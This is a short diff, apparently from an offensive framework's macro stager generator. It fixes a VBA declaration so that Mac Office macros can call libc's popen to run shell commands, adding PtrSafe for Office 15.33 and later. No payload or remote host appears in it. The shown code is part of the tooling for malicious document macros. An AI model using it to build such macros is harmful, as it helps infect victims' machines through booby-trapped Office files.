@@ -92,7 +92,7 @@ class Stager:
 
             macro = """
 #If MAC_OFFICE_VERSION >= 15.33 Then
-    Private Declare Function system Lib "libc.dylib" Alias "popen" (ByVal command As String) As LongPtr
+    Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String) As LongPtr
 #Else
     #If VBA7 Then
         Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
